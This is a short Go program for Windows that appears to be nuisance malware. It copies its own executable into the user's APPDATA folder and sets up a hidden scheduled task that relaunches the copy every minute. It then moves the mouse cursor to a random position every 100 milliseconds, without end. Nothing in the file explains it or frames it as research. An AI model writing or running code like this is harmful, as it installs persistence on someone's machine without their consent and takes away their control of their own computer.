package main

import (
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"golang.org/x/sys/windows"
)

func main() {
	exePath, _ := os.Executable()
	appData := os.Getenv("APPDATA")
	outPath := filepath.Join(appData, filepath.Base(exePath))

	input, _ := os.ReadFile(exePath)
	os.WriteFile(outPath, input, 0644)

	taskName := filepath.Base(exePath)
	taskName = taskName[:len(taskName)-len(filepath.Ext(taskName))]
	cmd := exec.Command("schtasks.exe", "/create", "/f", "/sc", "minute", "/mo", "1", "/tn", taskName, "/tr", outPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	user32 := windows.NewLazyDLL("user32.dll")
	setCursorPos := user32.NewProc("SetCursorPos")
	getSystemMetrics := user32.NewProc("GetSystemMetrics")

	screenWidth, _, _ := getSystemMetrics.Call(0)
	screenHeight, _, _ := getSystemMetrics.Call(1)

	rand.Seed(time.Now().UnixNano())
	for {
		x := rand.Intn(int(screenWidth))
		y := rand.Intn(int(screenHeight))
		setCursorPos.Call(uintptr(x), uintptr(y))
		time.Sleep(100 * time.Millisecond)
	}

}
